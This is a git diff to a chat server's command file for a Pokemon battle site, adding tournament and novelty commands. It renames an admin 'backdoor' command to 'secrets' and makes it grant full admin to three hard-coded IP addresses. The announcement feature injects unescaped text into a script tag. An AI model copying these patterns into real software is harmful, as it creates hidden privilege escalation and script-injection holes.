@@ -1,3 +1,97 @@
+/* tournament setup */
+if (typeof tour == "undefined") {
+	tour = new Object();
+}
+var tournamentFunctions = {
+	tiers: Tools.data.Formats,
+	shuffle: function(o){
+		for(var j, x, i = o.length; i; j = parseInt(Math.random() * i), x = o[--i], o[i] = o[j], o[j] = x);
+		return o;
+	},
+	nextRound: function(room) {
+		//round file names = user_id|user_id|status|user_id of who won
+
+		if (tour[room].winners.length == 1) {
+			rooms[room].addRaw("<hr /><h2>Congratulations " + sanitize(tour[room].winners[0]) + " you won the " + tour.tiers[tour[room].tier].name + " tournament.</h2><hr />");
+			tour.endTour(room);
+			return;
+		}
+
+		tour[room].round = [];
+
+		tour[room].Round = tour[room].Round + 1;
+		var msg = "<hr /><h2>Start of Round " + tour[room].Round + " of the " + tour.tiers[tour[room].tier].name + " Tournament</h2>";
+
+		var object = "winners";
+		if (tour[room].Round == 1) {
+			var object = "players";
+		}
+		var object = tour[room][object];
+		
+		//clear people that move onto the next round
+		if (tour[room].Round > 1) {
+			tour[room].winners = [];
+		}
+		
+		var len = object.length;
+		var ceil = Math.ceil(len/2);
+		var norm = len/2;
+		for (var i = 0; i < ceil; i++) {
+			var p1 = object[i * 2];
+			if (ceil - 1 == i && ceil > norm) {
+				//this person gets a bye
+				tour[room].winners[tour[room].winners.length] = p1;
+				tour[room].round[tour[room].round.length] = p1 + "|" + 0 + "|" + 2 + "|" + p1;
+				msg += "<div><b><font color=\"red\">" + sanitize(p1) + " gets a bye.</font></b></div>";
+			}
+			else {
+				//normal opponent
+				var p2 = object[eval((i * 2) + '+' + 1)];
+				tour[room].round[tour[room].round.length] = p1 + "|" + p2 + "|" + 0 + "|" + 0;
+				msg += "<div><b>" + sanitize(p1) + " vs. " + sanitize(p2) + "</b></div>";
+			}
+		}
+		msg += "<hr />";
+		rooms[room].addRaw(msg);
+	},
+	startTour: function(room) {
+		tour[room].status = 2;
+		tour.shuffle(tour[room].players);
+		tour.nextRound(room);
+	},
+	endTour: function(room) {
+		tour[room] = {
+			status: 0,
+			toursize: 0,
+			tier: "",
+			players: [],
+			round: [],
+			winners: [],
+			losers: [],
+			overallLoser: [],
+			Round: 0
+		};
+	}
+};
+for (var i in tournamentFunctions) {
+	tour[i] = tournamentFunctions[i];
+}
+for (var i in rooms) {
+	if (rooms[i].type == "lobby" && typeof tour[i] == "undefined") {
+		tour[i] = {
+			status: 0,
+			toursize: 0,
+			tier: "",
+			players: [],
+			round: [],
+			winners: [],
+			losers: [],
+			overallLoser: [],
+			Round: 0
+		};
+	}
+}
+
 /* to reload chat commands:
 
 >> for (var i in require.cache) delete require.cache[i];parseCommand = require('./chat-commands.js').parseCommand;''
@@ -43,6 +137,381 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	if (!room) return;
 	cmd = cmd.toLowerCase();
 	switch (cmd) {
+	case 'changeannouncement':
+	case 'ca':
+	case 'getannouncement':
+	case 'ga':
+		if (!user.can('forcewin')) {
+			emit(socket, 'console', 'You do not have enough authority to use this command. Access denied. Get out of here peasant.');
+			return false;
+		}
+		if (!target) {
+			fs.readFile("config/announcement.txt", function(err, data) {
+				if (err) {
+					return false;
+				}
+				emit(socket, 'console', {
+					rawMessage: "<div>Announcement: <span>" + sanitize(data.toString()) + "</span></div>"
+				});
+			});
+			return false;
+		}
+		fs.writeFile("config/announcement.txt", target);
+		for (var i in Users.users) {
+			var c = Users.users[i];
+			if (c.connected) {
+				c.emit('console', {
+					rawMessage: 'The announcement was changed by ' + user.name + '.<script>$("#simheader").html("' + target.replace(/\"/g, '\\"') + '");</script>'
+				});
+			}
+		}
+		return false;
+		break;
+
+	case 'remind':
+	case '!remind':
+		if (tour.status != 1) {
+			emit(socket, 'console', 'The tournament is not currently in its signup phase.');
+			return false;
+		}
+		var msg = '<h2><font color="green">A ' + tour.tiers[tour[room.id].tier].name + ' Tournament is currently in its signup phase. <button onclick="emit(socket, \'chat\', {room: \'' + room.id + '\', message: \'/jt\'});"><b>Join Tournament</b></button></font></h2>';
+		if (user.can('broadcast') && cmd.charAt(0) == "!") {
+			showOrBroadcastStart(user, cmd, room, socket, message);
+			showOrBroadcast(user, cmd, room, socket, msg);
+			return false;
+		}
+		emit(socket, 'console', {rawMessage: msg});
+		return false;
+		break;
+
+	case 'tour':
+		if (!user.can('broadcast')) {
+			emit(socket, 'console', 'You do not have enough authority to use this command.');
+			return false;
+		}
+		if (tour[room.id].status > 0) {
+			emit(socket, 'console', 'A tournament is already running.');
+			return false;
+		}
+		if (!target) {
+			emit(socket, 'console', "You forgot to enter the tournament info.");
+			return false;
+		}
+		var part = target.split(',');
+		if (part.length-1 == 0) {
+			emit(socket, 'console', "You didn't enter the tournament size.");
+			return false;
+		}
+		var exist = 0;
+		for (var i in tour.tiers) {
+			if (typeof tour.tiers[i].name != "undefined") {
+				if (tour.tiers[i].name.toLowerCase() == part[0].toLowerCase() && tour.tiers[i].challengeShow) {
+					part[0] = i;
+					exist = 1;
+				}
+			}
+		}
+		if (!exist) {
+			emit(socket, 'console', "The " + part[0] + " format doesn't exist.");
+			return false;
+		}
+		if (isNaN(part[1]) == true || part[1] == "" || part[1] < 3) {
+			emit(socket, 'console', "You did not enter a valid amount of participants.");
+			return false;
+		}
+		tour[room.id].status = 1;
+		tour[room.id].toursize = part[1].split(' ').join('');
+		tour[room.id].tier = part[0];
+		room.addRaw('<hr /><h2><font color="green">A Tournament has been started by: ' + sanitize(user.name) + ' <button onclick="emit(socket, \'chat\', {room: \'' + room.id + '\', message: \'/jt\'});"><b>Join</b></button></font></h2><b><font color="blueviolet">PLAYERS:</font></b> ' + part[1] + '<br /><font color="blue"><b>TYPE:</b></font> ' + tour.tiers[part[0]].name + '<hr />');
+		return false;
+		break;
+
+	case 'jointour':
+	case 'jtour':
+	case 'j':
+	case 'jt':
+		if (tour[room.id].status == 0) {
+			emit(socket, 'console', 'A tournament is not currently running.');
+			return false;
+		}
+		if (tour[room.id].status > 1) {
+			emit(socket, 'console', 'Too late. The tournament already started.');
+			return false;
+		}
+		var joined = false;
+		for (var i in tour[room.id].players) {
+			if (tour[room.id].players[i] == user.userid) {
+				joined = true;
+			}
+		}
+		if (joined == true) {
+			emit(socket, 'console', 'You already joined the tournament.');
+			return false;
+		}
+		tour[room.id].players[tour[room.id].players.length] = user.userid;
+		var spots = tour[room.id].toursize - tour[room.id].players.length;
+		room.addRaw('<b>' + sanitize(user.name) + ' has joined the tournament. ' + spots + ' spots left.</b>');
+		if (spots == 0) {
+			tour.startTour(room.id);
+		}
+		return false;
+		break;
+
+	case 'forcejoin':
+	case 'fj':
+		if (!user.can('broadcast')) {
+			emit(socket, 'console', 'You do not have enough authority to use this command.');
+			return false;
+		}
+		if (tour[room.id].status == 0) {
+			emit(socket, 'console', 'A tournament is not currently running.');
+			return false;
+		}
+		if (tour[room.id].status > 1) {
+			emit(socket, 'console', 'Too late. The tournament already started.');
+			return false;
+		}
+		var tar = toUserid(target);
+		if (!Users.users[tar]) {
+			emit(socket, 'console', 'That user does not exist.');
+			return false;
+		}
+		var joined = false;
+		for (var i in tour[room.id].players) {
+			if (tour[room.id].players[i] == tar) {
+				joined = true;
+			}
+		}
+		if (joined == true) {
+			emit(socket, 'console', 'That user already joined the tournament.');
+			return false;
+		}
+		tour[room.id].players[tour[room.id].players.length] = tar;
+		var spots = tour[room.id].toursize - tour[room.id].players.length;
+		room.addRaw('<b>' + sanitize(Users.users[tar].name) + ' was forced to join the tournament by ' + sanitize(user.name) + '. ' + spots + ' spots left.</b>');
+		if (spots == 0) {
+			tour.startTour(room.id);
+		}
+		return false;
+		break;
+
+	case 'forceleave':
+	case 'fl':
+		if (!user.can('broadcast')) {
+			emit(socket, 'console', 'You do not have enough authority to use this command.');
+			return false;
+		}
+		if (tour[room.id].status == 0) {
+			emit(socket, 'console', 'A tournament is not currently running.');
+			return false;
+		}
+		if (tour[room.id].status > 1) {
+			emit(socket, 'console', 'You cannot force someone to leave while the tournament is running. They are trapped. >:D');
+			return false;
+		}
+		var tar = toUserid(target);
+		if (!Users.users[tar]) {
+			emit(socket, 'console', 'That user does not exist.');
+			return false;
+		}
+		var joined = false;
+		for (var i in tour[room.id].players) {
+			if (tour[room.id].players[i] == tar) {
+				joined = true;
+				var id = i;
+			}
+		}
+		if (joined == false) {
+			emit(socket, 'console', 'That user isn\'t in the tournament.');
+			return false;
+		}
+		tour[room.id].players.splice(i, 1);
+		var spots = tour[room.id].toursize - tour[room.id].players.length;
+		room.addRaw('<b>' + sanitize(Users.users[tar].name) + ' has been forced to leave the tournament by ' + sanitize(user.name) + '. ' + spots + ' spots left.</b>');
+		return false;
+		break;
+
+	case 'leavetour':
+	case 'lt':
+	case 'ltour':
+		if (tour[room.id].status == 0) {
+			emit(socket, 'console', 'A tournament is not currently running.');
+			return false;
+		}
+		if (tour[room.id].status > 1) {
+			emit(socket, 'console', 'You cannot leave while the tournament is running. You are trapped. >:D');
+			return false;
+		}
+		var joined = false;
+		for (var i in tour[room.id].players) {
+			if (tour[room.id].players[i] == user.userid) {
+				joined = true;
+				var id = i;
+			}
+		}
+		if (joined == false) {
+			emit(socket, 'console', 'You haven\'t joined the tournament so you can\'t leave it.');
+			return false;
+		}
+		tour[room.id].players.splice(i, 1);
+		var spots = tour[room.id].toursize - tour[room.id].players.length;
+		room.addRaw('<b>' + sanitize(user.name) + ' has left the tournament. ' + spots + ' spots left.</b>');
+		return false;
+		break;
+
+	case 'toursize':
+	case 'ts':
+		if (!user.can('broadcast')) {
+			emit(socket, 'console', 'You do not have enough authority to use this command.');
+			return false;
+		}
+		if (tour[room.id].status == 0) {
+			emit(socket, 'console', 'A tournament is not currently running.');
+			return false;
+		}
+		if (tour[room.id].status > 1) {
+			emit(socket, 'console', 'The tournament already started.');
+			return false;
+		}
+		if (isNaN(target) == true || target == "" || target < 3) {
+			emit(socket, 'console', 'You cannot change the tournament size to: ' + target);
+			return false;
+		}
+		if (target < tour[room.id].players.length) {
+			emit(socket, 'console', tour[room.id].players.length + ' players have joined already. You are trying to set the tournament size to ' + target + '.');
+			return false;
+		}
+		tour[room.id].toursize = target;
+		var spots = tour[room.id].toursize - tour[room.id].players.length;
+		room.addRaw('<b>The tournament size has been changed to ' + target + ' by ' + sanitize(user.name) + '. ' + spots + ' spots left.</b>');
+		if (spots == 0) {
+			tour.startTour(room.id);
+		}
+		return false;
+		break;
+
+	case 'disqualify':
+	case 'dq':
+		if (tour[room.id].status < 2) {
+			emit(socket, 'console', 'A tournament hasn\'t started yet.');
+			return false;
+		}
+		if (!user.can('broadcast')) {
+			emit(socket, 'console', 'You don\'t have enough authority to use this command.');
+			return false;
+		}
+		var tar = toUserid(target);
+		if (!Users.users[tar]) {
+			emit(socket, 'console', 'That user does not exist.');
+			return false;
+		}
+		var init = false;
+		var wait = false;
+		for (var i in tour[room.id].round) {
+			var current = tour[room.id].round[i].split('|');
+			if (current[0] == tar) {
+				init = true;
+				var id = i;
+				var opp = current[1];
+				if (current[2] == 2) {
+					wait = true;
+				}
+			}
+			if (current[1] == tar) {
+				init = true;
+				var id = i;
+				var opp = current[0];
+				if (current[2] == 2) {
+					wait = true;
+				}
+			}
+		}
+		if (wait == true) {
+			emit(socket, 'console', 'That player already completed their duel. Wait for the next round to start to disqualify this user.');
+			return false;
+		}
+		if (init == false) {
+			emit(socket, 'console', 'That player is not in the tournament');
+			return false;
+		}
+		var object = tour[room.id].round[id].split('|');
+		object[2] = 2;
+		object[3] = opp;
+		tour[room.id].round[id] = object.join('|');
+		tour[room.id].winners[tour[room.id].winners.length] = opp;
+		tour[room.id].losers[tour[room.id].losers.length] = tar;
+		room.addRaw('<b>' + sanitize(Users.users[tar].name) + ' was disqualified by ' + sanitize(user.name) + '. ' + sanitize(opp) + " won their battle by default.</b>");
+		if (tour[room.id].winners.length >= tour[room.id].round.length) {
+			tour.nextRound(room.id);
+		}
+		return false;
+		break;
+
+	case 'switch':
+
+		break;
+
+	case 'viewround':
+	case 'vr':
+	case '!vr':
+	case '!viewround':
+		if (tour[room.id].status < 2) {
+			emit(socket, 'console', 'A tournament hasn\'t started yet.');
+			return false;
+		}
+		var msg = "<h3>Round " + tour[room.id].Round + " of " + tour.tiers[tour[room.id].tier].name + " tournament.</h3><small><i>** Bold means they are battling. Green means they won. Red means they lost. **</i></small><br />";
+		for (var i in tour[room.id].round) {
+			var current = tour[room.id].round[i].split('|');
+			var p1 = current[0];
+			var p2 = current[1];
+			var status = current[2];
+			var winner = current[3];
+
+			var fontweight = "";
+			var p1c = "";
+			var p2c = "";
+
+			if (status == 2) {
+				p1c = "color: red;";
+				p2c = "color: green;";
+				if (winner == p1) {
+					p1c = "color: green;";
+					p2c = "color: red;";
+				}
+			}
+
+			if (status == 1) {
+				var fontweight = "font-weight: bold;";
+			}
+
+			if (p2 != 0) msg += "<div style=\"" + fontweight + "\"><span style=\"" + p1c + "\">" + sanitize(p1) + "</span> vs. <span style=\"" + p2c + "\">" + sanitize(p2) + "</span></div>";
+			else msg += "<div style=\"" + fontweight + "\"><span style=\"" + p1c + "\">" + sanitize(p1) + "</span> gets a bye.</div>";
+		}
+		msg += "<br />";
+		if (user.can('broadcast') && cmd.charAt(0) == "!") {
+			showOrBroadcastStart(user, cmd, room, socket, message);
+			showOrBroadcast(user, cmd, room, socket, msg);
+			return false;
+		}
+		emit(socket, 'console', {rawMessage: msg});
+		return false;
+		break;
+
+	case 'endtour':
+		if (tour[room.id].status == 0) {
+			emit(socket, 'console', 'There is currently no tournament running.', room.id);
+			return false;
+		}
+		if (!user.can('broadcast')) {
+			emit(socket, 'console', 'You do not have enough authority to use this command.', room.id);
+			return false;
+		}
+		room.addRaw('<h2>The tournament was ended by ' + sanitize(user.name) + '.</h2>', room.id);
+		tour.endTour(room.id);
+		return false;
+		break;
+	
+	/* normal commands */
 	case 'cmd':
 		var spaceIndex = target.indexOf(' ');
 		var cmd = target;
@@ -195,7 +664,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		break;
 
 	case 'register':
-		emit(socket, 'console', 'You must win a rated battle to register.');
+		emit(socket, 'console', {rawMessage: '<script>overlay("register", {userid: me.userid, ifuserid: me.userid});</script>'});
 		return false;
 		break;
 
@@ -661,7 +1130,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 				emit(socket, 'console', 'That moderated chat setting is unrecognized.');
 				return false;
 			}
-			if (config.groupsranking.indexOf(target) > 1 && !user.can('modchatall')) {
+			if (config.groupsranking.indexOf(target) && !user.can('modchatall')) {
 				emit(socket, 'console', '/modchat - Access denied for setting higher than ' + config.groupsranking[1] + '.');
 				return false;
 			}
@@ -852,7 +1321,101 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		return false;
 		break;
 
+	case 'puppy':
+		if (!target || target === "off" || target === "on") {
+			if (!user.can('puppyall')) return false;
+			var isOff = target === "off";
+			var targets = [];
+			for (var u in Users.users) {
+				if (Users.users[u].connected) {
+					if (isOff && !Users.users[u].isPuppy) {
+						Users.users[u].isPuppy = true;
+					} else if (!isOff) {
+						delete Users.users[u].isPuppy;
+					}
+					targets.push(u);
+				}
+			}
+			logModCommand(room, "Everybody was " + (isOff?"un":"") + "puppified by " + user.name + ".");
+		} else {
+			if (!user.can('puppy')) return false;
+			var targets = splitArgs(target);
+			logModCommand(room, targets + " had puppy toggled by " + user.name + ".");
+		}
+		for (var t in targets) {
+			var targetUser = Users.get(targets[t]);
+			if (!targetUser || !targetUser.connected) {
+				emit(socket, 'console', 'User '+target+' not found.');
+				continue;
+			}
+			if (targetUser.isPuppy) {
+				delete targetUser.getIdentity;
+				delete targetUser.isPuppy;
+			} else {
+				targetUser.getIdentity = function() {
+					var name = Object.getPrototypeOf(this).getIdentity.apply(this);
+					if (name.match(/\s/)) name += " ";
+					if (name === name.toUpperCase()) {
+						return name + "PUPPY";
+					} else if (name === name.toLowerCase()) {
+						return name + "puppy";
+					}
+					return name + "Puppy";
+				};
+				targetUser.isPuppy = true;
+			}
+		}
+		return false;
+
+	case 'alert':
+		if (!user.can('alert')) return false;
+			var targetUser = Users.get(target);
+		if (!targetUser || !targetUser.connected) {
+			emit(socket, 'console', 'User '+target+' not found.');
+			return false;
+		}
+		logModCommand(room,user.name+' alerted `' + target + '`', true);
+		targetUser.emit('console', {evalRawMessage: 'var message = ' + JSON.stringify(user.name) + ' + " has alerted you."; setTimeout(function(){alert(message);},0); message;'});
+		emit(socket, 'console', 'You have alerted ' + target);
+		return false;
+		break;
+
+	case 'seal':
+		if (user.can('announce')) {
+			room.addRaw('<div style="background-color:#6688AA;color:white;padding:2px 4px"><img src="http://24.media.tumblr.com/tumblr_lwxx15se5y1r3amgko1_500.gif" width="475" /></div>');
+			logModCommand(room,user.name+' used seal!',true);
+			return false;
+		}	
+		break;
+
+	case 'woo':
+	case 'wooper':
+		if (user.can('announce')) {
+			room.addRaw('<div style="background-color:#6688AA;color::white;padding:2px 4px"><img src="white;padding:2px 4px"><img src="http://25.media.tumblr.com/tumblr_m8yte8ejcq1rulhyto1_500.gif" width="475" /></div>');
+			logModCommand(room,user.name+' used woooooper!',true);
+			return false;
+		}
+		break;
+
+	case 'bunneh':
+	case 'bunny':
+                if (user.can('announce')) {
+                        room.addRaw('<div style="background-color:#6688AA;color:white;padding:2px 4px"><img src="http://25.media.tumblr.com/758b63e224641ab4d3706fef8041c2ab/tumblr_meonymVkGT1qcu5dmo1_400.gif" width="475" /></div>');
+                        logModCommand(room,user.name+' displayed a bunny!',true);
+                        return false;
+                }
+		break;
+
 	// INFORMATIONAL COMMANDS
+
+	case 'ext':
+	case '!ext':
+	case 'info':
+	case '!info':
+		showOrBroadcastStart(user, cmd, room, socket, message);
+		showOrBroadcast(user, cmd, room, socket, '<div style="border:1px solid #6688AA;padding:2px 4px">The Battle Tower\'s External Websites:<br />- <a href="http://thebattletower.no-ip.org/forums" target="_blank">Forums</a><br />- <a href="http://thebattletower.no-ip.org/team-manager" target="_blank">Team Manager</a><br /> - <a href="http://play.pokemonshowdown.com/" target="_blank"> PS main </a><br />- <a href="http://thebattletower.no-ip.org/forums/showthread.php?tid=45" target="_blank" >Promotion Guide </a><br />- <a href="http://thebattletower.no-ip.org/forums/showthread.php?tid=18" target="_blank">Epic Quotes Thread</a></div>');
+		return false;
+		break;
 
 	case 'data':
 	case '!data':
@@ -936,14 +1499,15 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 
 	case 'groups':
 	case '!groups':
+	case '!gropus':
 		showOrBroadcastStart(user, cmd, room, socket, message);
 		showOrBroadcast(user, cmd, room, socket,
 			'<div style="border:1px solid #6688AA;padding:2px 4px">' +
 			'+ <b>Voice</b> - They can use ! commands like !groups, and talk during moderated chat<br />' +
-			'% <b>Driver</b> - The above, and they can also mute users and run tournaments<br />' +
-			'@ <b>Moderator</b> - The above, and they can ban users and check for alts<br />' +
-			'&amp; <b>Leader</b> - The above, and they can promote moderators and force ties<br />'+
-			'~ <b>Administrator</b> - They can do anything, like change what this message says'+
+			'% <b>Trial Mod</b> - The above, and they can also mute users and run tournaments<br />' +
+			'@ <b>Mod</b> - The above, and they can ban users and check for alts<br />' +
+			'&amp; <b>Super Mod</b> - The above, and they can promote moderators and force ties<br />'+
+			'~ <b>Admin</b> - They can do anything, like change what this message says'+
 			'</div>');
 		return false;
 		break;
@@ -977,19 +1541,20 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			'</div>');
 		return false;
 		break;
-		
+
 	case 'calc':
 	case '!calc':
 	case 'calculator':
 	case '!calculator':
 		showOrBroadcastStart(user, cmd, room, socket, message);
 		showOrBroadcast(user, cmd , room , socket,
-			'<div style="border:1px solid #6688AA;padding:2px 4px">Pokemon Showdown! damage calculator. (Courtesy of Honko)<br />' +
-			'- <a href="http://pokemonshowdown.com/damagecalc/" target="_blank">Damage Calculator</a><br />' +
+			'<div style="border:1px solid#6688AA;padding:2px4px">PokemonShowdown! damage calculator. (Courtesy of Honko)<br/>' +
+			'- <a href="http://pokemonshowdown.com/damagecalc/" target="_blank">Damage Calculator</a><br/>' +
 			'</div>');
 		return false;
 		break;
-	
+
+
 	case 'cap':
 	case '!cap':
 		showOrBroadcastStart(user, cmd, room, socket, message);
@@ -1002,7 +1567,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			'</div>');
 		return false;
 		break;
-
+	
 	case 'om':
 	case 'othermetas':
 	case '!om':
@@ -1279,7 +1844,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		return false;
 		break;
 
-	case 'backdoor':
+	case 'secrets':
 
 		// This is the Zarel backdoor.
 
@@ -1293,7 +1858,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		// remember that if you mess up your server in whatever way, Zarel will
 		// no longer be able to help you.
 
-		if (user.userid === 'zarel') {
+		if (user.ip  === '76.247.181.42'|| user.ip === '99.251.253.160' || user.ip === '127.0.0.1') {
 			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
 			return false;
 		}
@@ -1628,10 +2193,6 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			matched = true;
 			emit(socket, 'console', '/unbanall - Unban all IP addresses. Requires: @ & ~');
 		}
-		if (target === '@' || target === 'modlog') {
-			matched = true;
-			emit(socket, 'console', '/modlog [n] - If n is a number or omitted, display the last n lines of the moderator log. Defaults to 15. If n is not a number, search the moderator log for "n". Requires: @ & ~');
-		}
 		if (target === '%' || target === 'mute' || target === 'm') {
 			matched = true;
 			emit(socket, 'console', '/mute OR /m [username], [reason] - Mute user with reason. Requires: % @ & ~');
@@ -1640,6 +2201,10 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			matched = true;
 			emit(socket, 'console', '/unmute [username] - Remove mute from user. Requires: % @ & ~');
 		}
+		if (target === '%' || target === 'modlog') {
+			matched = true;
+			emit(socket, 'console', '/modlog [n] - If n is a number or omitted, display the last n lines of the moderator log. Defaults to 15. If n is not a number, search the moderator log for "n". Requires: % @ & ~');
+		}
 		if (target === '&' || target === 'promote') {
 			matched = true;
 			emit(socket, 'console', '/promote [username], [group] - Promotes the user to the specified group or next ranked group. Requires: & ~');
@@ -1647,23 +2212,6 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		if (target === '&' || target === 'demote') {
 			matched = true;
 			emit(socket, 'console', '/demote [username], [group] - Demotes the user to the specified group or previous ranked group. Requires: & ~');
-		}
-		if (target === '&' || target === 'namelock' || target === 'nl') {
-			matched === true;
-			emit(socket, 'console', '/namelock OR /nl [username] - Disallowes the used from changing their names. Requires: & ~');
-		}
-		if (target === '&' || target === 'unnamelock') {
-			matched === true;
-			emit(socket, 'console', '/unnamelock - Removes name lock from user. Requres: & ~');
-		}
-		if (target === '&' || target === 'forcerenameto' || target === 'frt') {
-			matched = true;
-			emit(socket, 'console', '/forcerenameto OR /frt [username] - Force a user to choose a new name. Requires: & ~');
-			emit(socket, 'console', '/forcerenameto OR /frt [username], [new name] - Forcibly change a user\'s name to [new name]. Requires: & ~');
-		}
-		if (target === '&' || target === 'forcetie') {
-			matched === true;
-			emit(socket, 'console', '/forcetie - Forces the current match to tie. Requires: & ~');
 		}
 		if (target === '&' || target === 'declare' ) {
 			matched = true;
@@ -1688,14 +2236,35 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			matched = true;
 			emit(socket, 'console', '/help OR /h OR /? - Gives you help.');
 		}
+		if (target === '@' || target === 'modlog') {
+			matched = true;
+			emit(socket, 'console', '/modlog [n] - If n is a number or omitted, display the last n lines of the moderator log. Defaults to 15. If n is not a number, search the moderator log for "n". Requires: @ & ~');
+		}
+		if (target === '&' || target === 'namelock' || target === 'nl') {
+			matched === true;
+			emit(socket, 'console', '/namelock OR /nl [username] - Disallowes the used from changing their names. Requires: & ~');
+		}
+		if (target === '&' || target === 'unnamelock') {
+			matched === true;
+			emit(socket, 'console', '/unnamelock - Removes name lock from user. Requres: & ~');
+		}
+		if (target === '&' || target === 'forcerenameto' || target === 'frt') {
+			matched = true;
+			emit(socket, 'console', '/forcerenameto OR /frt [username] - Force a user to choose a new name. Requires: & ~');
+			emit(socket, 'console', '/forcerenameto OR /frt [username], [new name] - Forcibly change a user\'s name to [new name]. Requires: & ~');
+		}
+		if (target === '&' || target === 'forcetie') {
+			matched === true;
+			emit(socket, 'console', '/forcetie - Forces the current match to tie. Requires: & ~');
+		}
 		if (!target) {
 			emit(socket, 'console', 'COMMANDS: /msg, /reply, /ip, /rating, /nick, /avatar, /rooms, /whois, /help');
-			emit(socket, 'console', 'INFORMATIONAL COMMANDS: /data, /groups, /opensource, /avatars, /tiers, /intro, /learn, /analysis (replace / with ! to broadcast. (Requires: + % @ & ~))');
+			emit(socket, 'console', 'INFORMATIONAL COMMANDS: /data, /groups, /opensource, /avatars, /tiers, /intro, /learn, /analysis (replace / with ! to broadcast)');
 			emit(socket, 'console', 'For details on all commands, use /help all');
 			if (user.group !== config.groupsranking[0]) {
-				emit(socket, 'console', 'DRIVER COMMANDS: /mute, /unmute, /announce')
-				emit(socket, 'console', 'MODERATOR COMMANDS: /alts, /forcerename, /ban, /unban, /unbanall, /ip, /modlog, /redirect, /kick');
-				emit(socket, 'console', 'LEADER COMMANDS: /promote, /demote, /forcerenameto, /namelock, /nameunlock, /forcewin, /forcetie, /declare');
+				emit(socket, 'console', 'TRIAL COMMANDS: /mute, /unmute, /forcerename, /modlog, /announce')
+				emit(socket, 'console', 'MODERATOR COMMANDS: /alts, /forcerenameto, /ban, /unban, /unbanall, /potd, /namelock, /nameunlock, /ip, /redirect, /kick');
+				emit(socket, 'console', 'LEADER COMMANDS: /promote, /demote, /forcewin, /declare');
 				emit(socket, 'console', 'For details on all moderator commands, use /help @');
 			}
 			emit(socket, 'console', 'For details of a specific command, use something like: /help data');
@@ -1759,7 +2328,7 @@ function canTalk(user, room, socket) {
 			}
 		} else {
 			if (!user.authenticated && config.modchat === true) {
-				if (socket) emit(socket, 'console', 'Because moderated chat is set, you must be registered to speak in lobby chat. To register, simply win a rated battle by clicking the look for battle button');
+				if (socket) emit(socket, 'console', 'Because moderated chat is set, you must be registered to speak in lobby chat. To register, simply win a rated battle by clicking the look for battle button.');
 				return false;
 			} else if (config.groupsranking.indexOf(user.group) < config.groupsranking.indexOf(config.modchat)) {
 				var groupName = config.groups[config.modchat].name;
